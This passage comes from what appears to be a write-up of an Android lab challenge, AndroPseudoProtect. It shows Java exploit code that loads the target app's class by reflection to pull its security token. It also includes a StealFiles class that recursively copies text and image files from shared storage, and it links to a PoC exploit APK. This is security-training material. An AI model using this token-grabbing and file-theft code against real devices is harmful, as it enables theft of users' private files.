            Class<?> clazz = classLoader.loadClass("com.eightksec.andropseudoprotect.SecurityUtils");

            // Create an instance and call the method
            Object instance = clazz.getDeclaredConstructor().newInstance();
            Method method = clazz.getMethod("getSecurityToken");

            // Invoke and capture the result
            Object result = method.invoke(instance);
            if (result != null) {
                return result.toString();
            }

        } catch (Exception e) {
            e.printStackTrace();
        }

        // Return null or a default value if anything fails
        return null;
    }
}
```

<br />

StealFiles.java

```java
package com.example.andropseudoprotect;

import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Environment;
import android.provider.Settings;
import android.util.Log;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;

public class StealFiles {

    public void copyFilesFromSdcard(Context context) {

        File sourceDir = Environment.getExternalStorageDirectory(); // /sdcard/
        File destDir = context.getFilesDir(); // app’s private files directory
        copyMatchingFiles(sourceDir, destDir);
    }

    private void copyMatchingFiles(File src, File destDir) {
        if (src == null || !src.exists()) return;

        File[] files = src.listFiles();
        if (files == null) return;

        for (File file : files) {
            if (file.isDirectory()) {
                // Recursively copy folders
                copyMatchingFiles(file, destDir);
            } else if (file.getName().endsWith(".txt")
                    || file.getName().endsWith(".jpg")
                    || file.getName().endsWith(".jpeg")
                    || file.getName().endsWith(".png")) {

                try (InputStream in = new FileInputStream(file);
                     OutputStream out = new FileOutputStream(new File(destDir, file.getName()))) {

                    byte[] buffer = new byte[4096];
                    int length;
                    while ((length = in.read(buffer)) > 0) {
                        out.write(buffer, 0, length);
                    }

                    Log.d("FileCopy", "Copied: " + file.getAbsolutePath());
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        }
    }

}
```

<br />

**Exploitation steps**

1. Launch the vulnerable target application.
2. In the app, click **Start Security** to trigger the file-encryption service.
3. Open the exploit application, grant the requested permissions, then press **AndroPseudoProtect Exploit**.



![](/assets/img/8ksec/AndroPseudoProtect/7.png)

8. The exploit app mutes the device and posts a dummy notification. It then broadcasts a decryption token to the target app and copies the target’s files from external storage into the exploit app’s files directory.

<br />

![](/assets/img/8ksec/AndroPseudoProtect/8.png)

<br />

Download the PoC exploit app from [here](https://github.com/karim-moftah/karim-moftah.github.io/raw/refs/heads/main/assets/img/8ksec/AndroPseudoProtect/AndroPseudoProtect-Exploit.apk)

